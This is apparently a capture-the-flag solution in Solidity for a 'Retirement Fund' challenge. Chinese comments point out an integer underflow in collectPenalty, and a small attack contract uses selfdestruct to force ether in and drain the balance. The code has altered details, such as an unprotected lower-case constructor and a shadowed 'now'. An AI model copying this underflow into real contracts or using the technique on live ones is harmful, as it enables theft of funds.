pragma solidity ^0.5.0;

contract RetirementFundChallenge {
    uint256 public startBalance;
    address owner = msg.sender;
    address public beneficiary;
    uint256 expiration = 10;
    uint256 now=9;
    function retirementFundChallenge(address player) public payable {
        require(msg.value == 1 ether);

        beneficiary = player;
        startBalance = msg.value;
    }
    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }
    function withdraw() public {
        require(msg.sender == owner);

        if (now < expiration) {
            // early withdrawal incurs a 10% penalty
            msg.sender.transfer(address(this).balance * 9 / 10);
        } else {
            msg.sender.transfer(address(this).balance);
        }
    }
    function collectPenalty() public {
        require(msg.sender == beneficiary);

        uint256 withdrawn = startBalance - address(this).balance;//存在溢出漏洞

        // an early withdrawal occurred
        require(withdrawn > 0);//只需要下溢

        // penalty is what's left
        msg.sender.transfer(address(this).balance);//只需要使用另一种方法向合约转账
    }
}
contract attack
{
    RetirementFundChallenge traget;
    constructor(address payable add) public payable
    {selfdestruct(add);//强制转账
    }
}
